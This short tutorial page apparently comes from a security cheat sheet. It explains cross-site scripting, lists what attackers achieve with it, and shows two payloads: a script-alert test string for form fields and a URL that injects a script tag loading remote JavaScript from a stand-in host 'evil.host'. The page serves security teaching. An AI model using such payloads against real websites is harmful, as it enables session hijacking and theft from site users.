# Cross-site scripting

XSS allows attackers to inject malicious scripts into a webpage. It's usually caused by insufficient input validation and improper encoding of user input that is displayed on web pages. Using XSS, attackers can achieve the following:

* Hijack accounts and sessions
* Steal sensitive information
* Modify page content and deface websites
* Redirect users to another webpage
* Record keystrokes
* Redirect to websites that exploit browser vulnerabilities
* Trick users into downloading files or entering information \(e.g. via phishing\)

## Basic technique

Put this in a form input field and see if it pops an alert box:

```text
<script>alert("hello");</script>
```

This is an example of reflected XSS. A stored XSS attack would mean the malicious script was permanently stored in the database \(e.g. as a comment on a discussion board\).

JavaScript can also be injected through a URL, which an unsuspecting person might click in an email:

```text
https://example.com/test.php?val=<script src=”http://evil.host/evil.js”></script>
```
